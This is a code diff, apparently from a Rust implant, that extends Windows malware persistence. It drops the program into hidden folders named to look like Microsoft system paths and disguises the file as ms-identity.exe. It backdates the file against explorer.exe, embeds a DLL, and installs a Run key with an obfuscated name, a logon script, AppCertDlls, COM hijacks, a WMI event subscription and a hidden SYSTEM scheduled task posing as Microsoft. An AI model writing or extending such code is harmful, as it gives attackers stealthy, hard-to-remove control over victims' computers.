@@ -6,7 +6,13 @@ use std::fs;
 use std::path::{Path, PathBuf};
 use std::process::Command;
 use tracing::{debug, error, info, warn};
-use winreg::{RegKey, enums::*};
+use windows::Win32::Foundation::VARIANT_BOOL;
+use windows::Win32::System::Com::*;
+use windows::Win32::System::TaskScheduler::*;
+use windows::Win32::System::Variant::*;
+use windows::core::{BSTR, ComInterface};
+use winreg::RegKey;
+use winreg::enums::{HKEY_CURRENT_USER, KEY_SET_VALUE};
 
 pub async fn install_persistence() {
     if !RecoveryControl::global().persistence_enabled() {
@@ -19,15 +25,26 @@ pub async fn install_persistence() {
     }
 }
 
+fn get_persistence_path() -> Option<(PathBuf, String)> {
+    let base_dirs = BaseDirs::new()?;
+    let local_data = base_dirs.data_local_dir();
+
+    let targets = [
+        ("Microsoft\\Windows\\IdentityCRL", "ms-identity.exe"),
+        ("Microsoft\\Crypto\\RSA", "crypto-svc.exe"),
+        ("Microsoft\\Windows\\Caches", "cld-cache.exe"),
+        ("Microsoft\\Windows\\DNT", "dnt-svc.exe"),
+        ("Microsoft\\Windows\\DeviceChauffeur", "dev-chauffeur.exe"),
+    ];
+
+    let (sub_dir, file_name) = targets[0];
+
+    Some((local_data.join(sub_dir), file_name.to_string()))
+}
+
 pub fn is_running_from_persistence() -> bool {
-    if let Some(base_dirs) = BaseDirs::new() {
-        let data_dir = base_dirs
-            .data_local_dir()
-            .join("Microsoft")
-            .join("Protect")
-            .join("S-1-5-21-2026");
-        let target_exe = data_dir.join("ms-protect.exe");
-        
+    if let Some((target_dir, file_name)) = get_persistence_path() {
+        let target_exe = target_dir.join(file_name);
         if let Ok(current) = env::current_exe() {
             return current == target_exe;
         }
@@ -37,19 +54,15 @@ pub fn is_running_from_persistence() -> bool {
 
 async fn install_persistence_impl() -> Result<(), Box<dyn std::error::Error>> {
     let current_exe = env::current_exe()?;
-    let base_dirs = BaseDirs::new().ok_or("failed to determine base directories")?;
+    let (data_dir, file_name) =
+        get_persistence_path().ok_or("failed to determine persistence path")?;
 
-    let data_dir = base_dirs
-        .data_local_dir()
-        .join("Microsoft")
-        .join("Protect")
-        .join("S-1-5-21-2026");
     if !data_dir.exists() {
         fs::create_dir_all(&data_dir)?;
         set_hidden_system(&data_dir);
     }
 
-    let target_exe = data_dir.join("ms-protect.exe");
+    let target_exe = data_dir.join(file_name);
 
     if current_exe == target_exe {
         debug!("running from persistence location");
@@ -67,6 +80,17 @@ async fn install_persistence_impl() -> Result<(), Box<dyn std::error::Error>> {
         Ok(_) => {
             set_hidden_system(&target_exe);
             timestomp(&target_exe, &PathBuf::from(r"C:\Windows\explorer.exe"));
+
+            #[cfg(feature = "embedded_persistence_dll")]
+            {
+                let mut dll_path = target_exe.clone();
+                dll_path.set_extension("dll");
+                let dll_bytes = include_bytes!(concat!(env!("OUT_DIR"), "/persistence_dll.blob"));
+                if fs::write(&dll_path, dll_bytes).is_ok() {
+                    set_hidden_system(&dll_path);
+                    timestomp(&dll_path, &PathBuf::from(r"C:\Windows\explorer.exe"));
+                }
+            }
         }
         Err(err) => {
             warn!(error = %err, "failed to copy executable (might be running)");
@@ -172,6 +196,34 @@ fn ensure_persistence_mechanisms(path: &Path) -> Result<(), Box<dyn std::error::
     let _ = ensure_hidden_scheduled_task(path);
     let _ = ensure_com_hijack_refined(path);
     let _ = ensure_wmi_event_consumer(path);
+    let _ = ensure_user_init_mpr_logon_script(path);
+    let _ = ensure_app_cert_dlls_persistence(path);
+    Ok(())
+}
+
+fn ensure_user_init_mpr_logon_script(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
+    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+    if let Ok((key, _)) = hkcu.create_subkey(r"Environment") {
+        let _ = key.set_value("UserInitMprLogonScript", &path.to_string_lossy().as_ref());
+    }
+    Ok(())
+}
+
+fn ensure_app_cert_dlls_persistence(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
+    if !is_admin() {
+        return Ok(());
+    }
+
+    let hklm = RegKey::predef(winreg::enums::HKEY_LOCAL_MACHINE);
+    let key_path = r"System\CurrentControlSet\Control\Session Manager\AppCertDlls";
+
+    if let Ok((key, _)) = hklm.create_subkey(key_path) {
+        let mut dll_path = path.to_path_buf();
+        dll_path.set_extension("dll");
+
+        let _ = key.set_value("WinMgmtHealthSvc", &dll_path.to_string_lossy().as_ref());
+    }
+
     Ok(())
 }
 
@@ -182,9 +234,10 @@ fn ensure_registry_run_key(path: &Path) -> Result<(), Box<dyn std::error::Error>
         KEY_SET_VALUE,
     )?;
 
+    // "Microsoft Identity Provider"
     let app_name = deobf(&[
-        0xF0, 0xD4, 0xDE, 0xCF, 0xD2, 0xCE, 0xD2, 0xDB, 0xC9, 0xF5, 0xD2, 0xCE, 0xC9, 0xED, 0xCF,
-        0xD2, 0xC9, 0xD8, 0xDE, 0xC9, 0xD4, 0xD2, 0xD3,
+        0x93, 0x4D, 0x7B, 0xD3, 0x72, 0x2C, 0xDC, 0x75, 0xAD, 0x9D, 0x7B, 0xEA, 0x12, 0x92, 0x78,
+        0x86, 0x1A, 0x3D, 0xC0, 0x36, 0x99, 0x14, 0x36, 0x15, 0xA6, 0x93, 0x6C,
     ]);
     run_key.set_value(app_name, &path.to_string_lossy().as_ref())?;
     Ok(())
@@ -199,27 +252,65 @@ fn is_admin() -> bool {
 }
 
 fn ensure_hidden_scheduled_task(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
-    let task_name = deobf(&[
-        0xF0, 0xD4, 0xDE, 0xCF, 0xD2, 0xCE, 0xD2, 0xDB, 0xC9, 0xEA, 0xD4, 0xD3, 0xD9, 0xD2, 0xCA,
-        0xCE, 0xEE, 0xC4, 0xCE, 0xC9, 0xD8, 0xD0, 0x97, 0xD4, 0xDC, 0xD3, 0xD2, 0xCE, 0xC9, 0xD4,
-        0xDE, 0xCE,
-    ]);
-    let exe_path = path.to_string_lossy().replace("\"", "\\\"");
-    let script = if is_admin() {
-        format!(
-            "$action = New-ScheduledTaskAction -Execute '{}'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; Register-ScheduledTask -TaskName '{}' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force",
-            exe_path, task_name
-        )
-    } else {
-        format!(
-            "$action = New-ScheduledTaskAction -Execute '{}'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; Register-ScheduledTask -TaskName '{}' -Action $action -Trigger $trigger -Settings $settings -Force",
-            exe_path, task_name
-        )
-    };
+    unsafe {
+        let _ = CoInitializeEx(None, COINIT_MULTITHREADED);
 
-    let _ = Command::new("powershell")
-        .args(&["-NoProfile", "-WindowStyle", "Hidden", "-Command", &script])
-        .output();
+        let service: ITaskService = CoCreateInstance(&TaskScheduler, None, CLSCTX_INPROC_SERVER)?;
+        service.Connect(
+            VARIANT::default(),
+            VARIANT::default(),
+            VARIANT::default(),
+            VARIANT::default(),
+        )?;
+
+        let folder = service.GetFolder(&BSTR::from("\\"))?;
+        let task_definition = service.NewTask(0)?;
+
+        let reg_info = task_definition.RegistrationInfo()?;
+        let task_name = "WinMgmtEngineHealth";
+        reg_info.SetDescription(&BSTR::from("Windows Management Engine Health Check"))?;
+        reg_info.SetAuthor(&BSTR::from("Microsoft Corporation"))?;
+
+        let settings = task_definition.Settings()?;
+        settings.SetEnabled(VARIANT_BOOL::from(true))?;
+        settings.SetHidden(VARIANT_BOOL::from(true))?;
+        settings.SetAllowDemandStart(VARIANT_BOOL::from(true))?;
+        settings.SetStartWhenAvailable(VARIANT_BOOL::from(true))?;
+        settings.SetCompatibility(TASK_COMPATIBILITY_V2)?;
+
+        let triggers = task_definition.Triggers()?;
+        let trigger = triggers.Create(TASK_TRIGGER_LOGON)?;
+        let logon_trigger: ILogonTrigger = trigger.cast()?;
+        logon_trigger.SetEnabled(VARIANT_BOOL::from(true))?;
+
+        let actions = task_definition.Actions()?;
+        let action = actions.Create(TASK_ACTION_EXEC)?;
+        let exec_action: IExecAction = action.cast()?;
+
+        exec_action.SetPath(&BSTR::from(path.to_string_lossy().to_string()))?;
+
+        let principal = task_definition.Principal()?;
+        if is_admin() {
+            principal.SetRunLevel(TASK_RUNLEVEL_HIGHEST)?;
+            principal.SetLogonType(TASK_LOGON_SERVICE_ACCOUNT)?;
+            principal.SetUserId(&BSTR::from("NT AUTHORITY\\SYSTEM"))?;
+        } else {
+            principal.SetRunLevel(TASK_RUNLEVEL_LUA)?;
+            principal.SetLogonType(TASK_LOGON_INTERACTIVE_TOKEN)?;
+        }
+
+        folder.RegisterTaskDefinition(
+            &BSTR::from(task_name),
+            &task_definition,
+            TASK_CREATE_OR_UPDATE.0,
+            VARIANT::default(),
+            VARIANT::default(),
+            TASK_LOGON_NONE,
+            VARIANT::default(),
+        )?;
+
+        debug!("scheduled task persistence installed via COM API");
+    }
     Ok(())
 }
 
@@ -227,6 +318,9 @@ fn ensure_com_hijack_refined(path: &Path) -> Result<(), Box<dyn std::error::Erro
     let clsids = [
         "{42aedc87-2188-41fd-b9a3-0c966feabec1}", // MruLongList
         "{BCDE0395-E52F-467C-8E3D-C4579291692E}", // MmcDmp
+        "{FBEB8A05-BEEE-4442-8594-1592C541D06F}", // Speech Recognition
+        "{00021401-0000-0000-C000-000000000046}", // Shortcut
+        "{63354731-1688-4E7B-8228-05F7CE2A1145}", // Remote Assistance
     ];
 
     let hkcu = RegKey::predef(HKEY_CURRENT_USER);
@@ -254,8 +348,8 @@ fn ensure_wmi_event_consumer(path: &Path) -> Result<(), Box<dyn std::error::Erro
 
     unsafe {
         use windows::Win32::System::Com::*;
-        use windows::Win32::System::Wmi::*;
         use windows::Win32::System::Variant::*;
+        use windows::Win32::System::Wmi::*;
         use windows::core::{BSTR, PCWSTR};
 
         let _ = CoInitializeEx(None, COINIT_MULTITHREADED);
@@ -285,50 +379,97 @@ fn ensure_wmi_event_consumer(path: &Path) -> Result<(), Box<dyn std::error::Erro
         let task_name = "WinMgmtEngineHealth";
         let exe_path = path.to_string_lossy();
 
-        let put_prop = |inst: &IWbemClassObject, name: &str, value: &str| -> Result<(), Box<dyn std::error::Error>> {
+        let put_prop = |inst: &IWbemClassObject,
+                        name: &str,
+                        value: &str|
+         -> Result<(), Box<dyn std::error::Error>> {
             let mut v = VARIANT::default();
             let bstr_val = BSTR::from(value);
-            
+
             let v_inner = &mut v.Anonymous.Anonymous;
             v_inner.vt = VT_BSTR;
             v_inner.Anonymous.bstrVal = std::mem::ManuallyDrop::new(bstr_val);
             let name_bstr = BSTR::from(name);
-            inst.Put(PCWSTR::from_raw(name_bstr.as_wide().as_ptr()), 0, &v, 0).map_err(|e| e.to_string())?;
-            
+            inst.Put(PCWSTR::from_raw(name_bstr.as_wide().as_ptr()), 0, &v, 0)
+                .map_err(|e| e.to_string())?;
+
             Ok(())
         };
 
         let mut filter_class = None;
         let filter_class_name = BSTR::from("__EventFilter");
-        services.GetObject(&filter_class_name, WBEM_GENERIC_FLAG_TYPE(0), None, Some(&mut filter_class), None).map_err(|e| e.to_string())?;
+        services
+            .GetObject(
+                &filter_class_name,
+                WBEM_GENERIC_FLAG_TYPE(0),
+                None,
+                Some(&mut filter_class),
+                None,
+            )
+            .map_err(|e| e.to_string())?;
         let filter_class = filter_class.ok_or("failed to get __EventFilter class")?;
-        
+
         let filter_inst = filter_class.SpawnInstance(0).map_err(|e| e.to_string())?;
 
         put_prop(&filter_inst, "Name", task_name)?;
         put_prop(&filter_inst, "QueryLanguage", "WQL")?;
-        put_prop(&filter_inst, "Query", "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'")?;
+        put_prop(
+            &filter_inst,
+            "Query",
+            "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'",
+        )?;
         put_prop(&filter_inst, "EventNamespace", "root\\cimv2")?;
 
-        services.PutInstance(&filter_inst, WBEM_GENERIC_FLAG_TYPE(WBEM_FLAG_CREATE_OR_UPDATE.0 as _), None, None).map_err(|e| e.to_string())?;
+        services
+            .PutInstance(
+                &filter_inst,
+                WBEM_GENERIC_FLAG_TYPE(WBEM_FLAG_CREATE_OR_UPDATE.0 as _),
+                None,
+                None,
+            )
+            .map_err(|e| e.to_string())?;
 
         let mut consumer_class = None;
         let consumer_class_name = BSTR::from("CommandLineEventConsumer");
-        services.GetObject(&consumer_class_name, WBEM_GENERIC_FLAG_TYPE(0), None, Some(&mut consumer_class), None).map_err(|e| e.to_string())?;
-        let consumer_class = consumer_class.ok_or("failed to get CommandLineEventConsumer class")?;
-        
+        services
+            .GetObject(
+                &consumer_class_name,
+                WBEM_GENERIC_FLAG_TYPE(0),
+                None,
+                Some(&mut consumer_class),
+                None,
+            )
+            .map_err(|e| e.to_string())?;
+        let consumer_class =
+            consumer_class.ok_or("failed to get CommandLineEventConsumer class")?;
+
         let consumer_inst = consumer_class.SpawnInstance(0).map_err(|e| e.to_string())?;
 
         put_prop(&consumer_inst, "Name", task_name)?;
         put_prop(&consumer_inst, "CommandLineTemplate", &exe_path)?;
 
-        services.PutInstance(&consumer_inst, WBEM_GENERIC_FLAG_TYPE(WBEM_FLAG_CREATE_OR_UPDATE.0 as _), None, None).map_err(|e| e.to_string())?;
+        services
+            .PutInstance(
+                &consumer_inst,
+                WBEM_GENERIC_FLAG_TYPE(WBEM_FLAG_CREATE_OR_UPDATE.0 as _),
+                None,
+                None,
+            )
+            .map_err(|e| e.to_string())?;
 
         let mut binding_class = None;
         let binding_class_name = BSTR::from("__FilterToConsumerBinding");
-        services.GetObject(&binding_class_name, WBEM_GENERIC_FLAG_TYPE(0), None, Some(&mut binding_class), None).map_err(|e| e.to_string())?;
+        services
+            .GetObject(
+                &binding_class_name,
+                WBEM_GENERIC_FLAG_TYPE(0),
+                None,
+                Some(&mut binding_class),
+                None,
+            )
+            .map_err(|e| e.to_string())?;
         let binding_class = binding_class.ok_or("failed to get __FilterToConsumerBinding class")?;
-        
+
         let binding_inst = binding_class.SpawnInstance(0).map_err(|e| e.to_string())?;
 
         let filter_path = format!("__EventFilter.Name=\"{}\"", task_name);
@@ -337,7 +478,14 @@ fn ensure_wmi_event_consumer(path: &Path) -> Result<(), Box<dyn std::error::Erro
         put_prop(&binding_inst, "Filter", &filter_path)?;
         put_prop(&binding_inst, "Consumer", &consumer_path)?;
 
-        services.PutInstance(&binding_inst, WBEM_GENERIC_FLAG_TYPE(WBEM_FLAG_CREATE_OR_UPDATE.0 as _), None, None).map_err(|e| e.to_string())?;
+        services
+            .PutInstance(
+                &binding_inst,
+                WBEM_GENERIC_FLAG_TYPE(WBEM_FLAG_CREATE_OR_UPDATE.0 as _),
+                None,
+                None,
+            )
+            .map_err(|e| e.to_string())?;
 
         debug!("WMI permanent event subscription installed successfully");
     }
